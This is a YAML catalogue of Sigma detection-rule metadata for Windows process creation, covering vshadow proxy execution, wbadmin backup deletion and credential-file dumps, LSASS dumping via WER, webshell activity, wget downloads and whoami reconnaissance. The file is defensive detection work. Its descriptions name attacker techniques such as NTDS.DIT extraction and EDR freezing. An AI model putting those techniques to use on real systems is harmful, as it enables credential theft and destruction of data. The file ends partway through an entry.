- detection_id: d7c75059-2901-4578-b209-8837fd31c6a8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vshadow_exec.yml
  name: Proxy Execution via Vshadow
  description: 'Detects the invocation of vshadow.exe with the -exec parameter that
    executes a specified script or command after the shadow copies are created but
    before the VShadow tool exits.

    VShadow is a command-line tool that you can use to create and manage volume shadow
    copies. While legitimate backup or administrative scripts may use this flag,

    attackers can leverage this parameter to proxy the execution of malware.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Vshadow/
  - https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample
  false_positives:
  - System backup or administrator tools
  - Legitimate administrative scripts
  notes: ''
- detection_id: 43103702-5886-11ed-9b6a-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_vslsagent_agentextensionpath_load.yml
  name: Suspicious Vsls-Agent Command With AgentExtensionPath Load
  description: Detects Microsoft Visual Studio vsls-agent.exe lolbin execution with
    a suspicious library load using the --agentExtensionPath parameter
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/bohops/status/1583916360404729857
  false_positives:
  - False positives depend on custom use of vsls-agent.exe
  notes: ''
- detection_id: 6da2c9f5-7c53-401b-aacb-92c040ce1215
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_w32tm.yml
  name: Use of W32tm as Timer
  description: When configured with suitable command line arguments, w32tm can act
    as a delay mechanism
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1124
  tags:
  - attack.discovery
  - attack.t1124
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1124/T1124.md
  - https://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 395907ee-96e5-4666-af2e-2ca91688e151
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wab_execution_from_non_default_location.yml
  name: Wab Execution From Non Default Location
  description: Detects execution of wab.exe (Windows Contacts) and Wabmig.exe (Microsoft
    Address Book Import Tool) from non default locations as seen with bumblebee activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  time_window: ''
  references:
  - https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime
  - https://thedfirreport.com/2022/09/26/bumblebee-round-two/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 63d1ccc0-2a43-4f4b-9289-361b308991ff
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wab_unusual_parents.yml
  name: Wab/Wabmig Unusual Parent Or Child Processes
  description: Detects unusual parent or children of the wab.exe (Windows Contacts)
    and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used
    with bumblebee activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  time_window: ''
  references:
  - https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime
  - https://thedfirreport.com/2022/09/26/bumblebee-round-two/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 639c9081-f482-47d3-a0bd-ddee3d4ecd76
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wbadmin_delete_all_backups.yml
  name: All Backups Deleted Via Wbadmin.EXE
  description: 'Detects the deletion of all backups or system state backups via "wbadmin.exe".

    This technique is used by numerous ransomware families and actors.

    This may only be successful on server platforms that have Windows Backup enabled.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell
  - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md
  - https://www.sentinelone.com/labs/ranzy-ransomware-better-encryption-among-new-features-of-thunderx-derivative/
  - https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-report-avaddon-and-new-techniques-emerge-industrial-sector-targeted
  - https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/lockbit-attempts-to-stay-afloat-with-a-new-version/technical-appendix-lockbit-ng-dev-analysis.pdf
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-systemstatebackup
  false_positives:
  - Unknown
  notes: ''
- detection_id: 89f75308-5b1b-4390-b2d8-d6b2340efaf8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wbadmin_delete_backups.yml
  name: Windows Backup Deleted Via Wbadmin.EXE
  description: 'Detects the deletion of backups or system state backups via "wbadmin.exe".

    This technique is used by numerous ransomware families and actors.

    This may only be successful on server platforms that have Windows Backup enabled.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell
  - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md
  - https://www.sentinelone.com/labs/ranzy-ransomware-better-encryption-among-new-features-of-thunderx-derivative/
  - https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-report-avaddon-and-new-techniques-emerge-industrial-sector-targeted
  - https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/lockbit-attempts-to-stay-afloat-with-a-new-version/technical-appendix-lockbit-ng-dev-analysis.pdf
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-systemstatebackup
  false_positives:
  - Legitimate backup activity from administration scripts and software.
  notes: ''
- detection_id: 8b93a509-1cb8-42e1-97aa-ee24224cdc15
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml
  name: Sensitive File Dump Via Wbadmin.EXE
  description: 'Detects the dump of highly sensitive files such as "NTDS.DIT" and
    "SECURITY" hive.

    Attackers can leverage the "wbadmin" utility in order to dump sensitive files
    that might contain credential or sensitive information.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.003
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/blob/2cc01b01132b5c304027a658c698ae09dd6a92bf/yml/OSBinaries/Wbadmin.yml
  - https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-start-recovery
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-start-backup
  false_positives:
  - Legitimate backup operation by authorized administrators. Matches must be investigated
    and allowed on a case by case basis.
  notes: ''
- detection_id: 6fe4aa1e-0531-4510-8be2-782154b73b48
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wbadmin_restore_file.yml
  name: File Recovery From Backup Via Wbadmin.EXE
  description: 'Detects the recovery of files from backups via "wbadmin.exe".

    Attackers can restore sensitive files such as NTDS.DIT or Registry Hives from
    backups in order to potentially extract credentials.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-start-recovery
  - https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 84972c80-251c-4c3a-9079-4f00aad93938
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wbadmin_restore_sensitive_files.yml
  name: Sensitive File Recovery From Backup Via Wbadmin.EXE
  description: 'Detects the dump of highly sensitive files such as "NTDS.DIT" and
    "SECURITY" hive.

    Attackers can leverage the "wbadmin" utility in order to dump sensitive files
    that might contain credential or sensitive information.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.003
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/blob/2cc01b01132b5c304027a658c698ae09dd6a92bf/yml/OSBinaries/Wbadmin.yml
  - https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-start-recovery
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-start-backup
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1412aa78-a24c-4abd-83df-767dfb2c5bbe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_webdav_lnk_execution.yml
  name: Potentially Suspicious WebDAV LNK Execution
  description: Detects possible execution via LNK file accessed on a WebDAV server.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1204
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.t1204
  time_window: ''
  references:
  - https://www.trellix.com/en-us/about/newsroom/stories/research/beyond-file-search-a-novel-method.html
  - https://micahbabinski.medium.com/search-ms-webdav-and-chill-99c5b23ac462
  false_positives:
  - Unknown
  notes: ''
- detection_id: fa3c117a-bc0d-416e-a31b-0c0e80653efb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_webshell_chopper.yml
  name: Chopper Webshell Process Pattern
  description: Detects patterns found in process executions cause by China Chopper
    like tiny (ASPX) webshells
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Persistence
  techniques:
  - T1018
  - T1033
  - T1087
  - T1505.003
  tags:
  - attack.persistence
  - attack.discovery
  - attack.t1505.003
  - attack.t1018
  - attack.t1033
  - attack.t1087
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4ebc877f-4612-45cb-b3a5-8e3834db36c9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_webshell_hacking.yml
  name: Webshell Hacking Activity Patterns
  description: 'Detects certain parent child patterns found in cases in which a web
    shell is used to perform certain credential dumping or exfiltration activities
    on a compromised system

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Persistence
  techniques:
  - T1018
  - T1033
  - T1087
  - T1505.003
  tags:
  - attack.persistence
  - attack.discovery
  - attack.t1505.003
  - attack.t1018
  - attack.t1033
  - attack.t1087
  time_window: ''
  references:
  - https://youtu.be/7aemGhaE9ds?t=641
  false_positives:
  - Unlikely
  notes: ''
- detection_id: bed2a484-9348-4143-8a8a-b801c979301c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_webshell_recon_commands_and_processes.yml
  name: Webshell Detection With Command Line Keywords
  description: Detects certain command line parameters often used during reconnaissance
    activity via web shells
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Persistence
  techniques:
  - T1018
  - T1033
  - T1087
  - T1505.003
  tags:
  - attack.persistence
  - attack.discovery
  - attack.t1505.003
  - attack.t1018
  - attack.t1033
  - attack.t1087
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html
  - https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/
  - https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8202070f-edeb-4d31-a010-a26c72ac5600
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_webshell_susp_process_spawned_from_webserver.yml
  name: Suspicious Process By Web Server Process
  description: 'Detects potentially suspicious processes being spawned by a web server
    process which could be the result of a successfully placed web shell or exploitation

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1190
  - T1505.003
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.t1505.003
  - attack.t1190
  time_window: ''
  references:
  - https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF
  false_positives:
  - Particular web applications may spawn a shell process legitimately
  notes: ''
- detection_id: f64e5c19-879c-4bae-b471-6d84c8339677
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_webshell_tool_recon.yml
  name: Webshell Tool Reconnaissance Activity
  description: 'Detects processes spawned from web servers (PHP, Tomcat, IIS, etc.)
    that perform reconnaissance looking for the existence of popular scripting tools
    (perl, python, wget) on the system via the help commands

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://ragged-lab.blogspot.com/2020/07/webshells-automating-reconnaissance.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9a4ccd1a-3526-4d99-b980-9f9c5d3a6ff3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_werfault_lsass_shtinkering.yml
  name: Potential Credential Dumping Via WER
  description: Detects potential credential dumping via Windows Error Reporting LSASS
    Shtinkering technique which uses the Windows Error Reporting to dump lsass
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/deepinstinct/Lsass-Shtinkering
  - https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Asaf%20Gilboa%20-%20LSASS%20Shtinkering%20Abusing%20Windows%20Error%20Reporting%20to%20Dump%20LSASS.pdf
  false_positives:
  - Windows Error Reporting might produce similar behavior. In that case, check the
    PID associated with the "-p" parameter in the CommandLine.
  notes: ''
- detection_id: fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_werfault_reflect_debugger_exec.yml
  name: Potential ReflectDebugger Content Execution Via WerFault.EXE
  description: Detects execution of "WerFault.exe" with the "-pr" commandline flag
    that is used to run files stored in the ReflectDebugger key which could be used
    to store the path to the malware in order to masquerade the execution flow
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1036
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html
  - https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1f0b4cac-9c81-41f4-95d0-8475ff46b3e2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_werfaultsecure_abuse.yml
  name: PPL Tampering Via WerFaultSecure
  description: 'Detects potential abuse of WerFaultSecure.exe to dump Protected Process
    Light (PPL) processes like LSASS or to freeze security solutions (EDR/antivirus).

    This technique is used by tools such as EDR-Freeze and WSASS to bypass PPL protections
    and access sensitive information or disable security software.

    Distinct command line patterns help identify the specific tool:

    - WSASS usage typically shows: "WSASS.exe WerFaultSecure.exe [PID]" in ParentCommandLine

    - EDR-Freeze usage typically shows: "EDR-Freeze_[version].exe [PID] [timeout]"
    in ParentCommandLine

    Legitimate debugging operations using WerFaultSecure are rare in production environments
    and should be investigated.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://www.zerosalarium.com/2025/09/EDR-Freeze-Puts-EDRs-Antivirus-Into-Coma.html
  - https://github.com/TwoSevenOneT/EDR-Freeze/blob/a7f61030b36fbde89871f393488f7075d2aa89f6/EDR-Freeze.cpp#L53
  - https://www.zerosalarium.com/2025/09/Dumping-LSASS-With-WER-On-Modern-Windows-11.html
  - https://github.com/TwoSevenOneT/WSASS/blob/2c8fd9fa32143e7bc9f066e9511c6f8a57bc64b5/WSASS.cpp#L251
  false_positives:
  - Legitimate usage of WerFaultSecure for debugging purposes
  notes: ''
- detection_id: 396f6630-f3ac-44e3-bfc8-1b161bc00c4e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wermgr_susp_child_process.yml
  name: Suspicious Child Process Of Wermgr.EXE
  description: Detects suspicious Windows Error Reporting manager (wermgr.exe) child
    process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  - attack.t1036
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html
  - https://www.echotrail.io/insights/search/wermgr.exe
  - https://github.com/binderlabs/DirCreate2System
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5394fcc7-aeb2-43b5-9a09-cac9fc5edcd5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wermgr_susp_exec_location.yml
  name: Suspicious Execution Location Of Wermgr.EXE
  description: Detects suspicious Windows Error Reporting manager (wermgr.exe) execution
    location.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html
  - https://www.echotrail.io/insights/search/wermgr.exe
  - https://github.com/binderlabs/DirCreate2System
  false_positives:
  - Unknown
  notes: ''
- detection_id: 17f0c0a8-8bd5-4ee0-8c5f-a342c0199f35
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wget_download_direct_ip.yml
  name: Suspicious File Download From IP Via Wget.EXE
  description: Detects potentially suspicious file downloads directly from IP addresses
    using Wget.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://www.gnu.org/software/wget/manual/wget.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: a0d7e4d2-bede-4141-8896-bc6e237e977c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wget_download_susp_file_sharing_domains.yml
  name: Suspicious File Download From File Sharing Domain Via Wget.EXE
  description: Detects potentially suspicious file downloads from file sharing domains
    using wget.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  - https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv
  - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 40aa399c-7b02-4715-8e5f-73572b493f33
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_wget_download_susp_locations.yml
  name: Suspicious File Download From IP Via Wget.EXE - Paths
  description: Detects potentially suspicious file downloads directly from IP addresses
    and stored in suspicious locations using Wget.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://www.gnu.org/software/wget/manual/wget.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 725a9768-0f5e-4cb3-aec2-bc5719c6831a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_where_browser_data_recon.yml
  name: Suspicious Where Execution
  description: 'Adversaries may enumerate browser bookmarks to learn more about compromised
    hosts.

    Browser bookmarks may reveal personal information about users (ex: banking sites,
    interests, social media, etc.) as well as details about

    internal network resources such as servers, tools/dashboards, or other related
    infrastructure.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1217
  tags:
  - attack.discovery
  - attack.t1217
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: c248c896-e412-4279-8c15-1c558067b6fa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_whoami_all_execution.yml
  name: Enumerate All Information With Whoami.EXE
  description: Detects the execution of "whoami.exe" with the "/all" flag
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  - car.2016-03-001
  time_window: ''
  references:
  - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/
  - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/
  - https://www.youtube.com/watch?v=DsJ9ByX84o4&t=6s
  false_positives:
  - Unknown
  notes: ''
- detection_id: 79ce34ca-af29-4d0e-b832-fc1b377020db
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_whoami_execution_from_high_priv_process.yml
  name: Whoami.EXE Execution From Privileged Process
  description: Detects the execution of "whoami.exe" by privileged accounts that are
    often abused by threat actors
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.privilege-escalation
  - attack.discovery
  - attack.t1033
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment
  - https://web.archive.org/web/20221019044836/https://nsudo.m2team.org/en-us/
  false_positives:
  - Unknown
  notes: ''
- detection_id: bd8b828d-0dca-48e1-8a63-8a58ecf2644f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_whoami_groups_discovery.yml
  name: Group Membership Reconnaissance Via Whoami.EXE
  description: Detects the execution of whoami.exe with the /group command line flag
    to show group membership for the current user, account type, security identifiers
    (SID), and attributes.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami
  false_positives:
  - Unknown
  notes: ''
- detection_id: c30fb093-1109-4dc8-88a8-b30d11c95a5d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_whoami_output.yml
  name: Whoami.EXE Execution With Output Option
  description: Detects the execution of "whoami.exe" with the "/FO" flag to choose
    CSV as output format or with redirection options to export the results to a file
    for later use.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  - car.2016-03-001
  time_window: ''
  references:
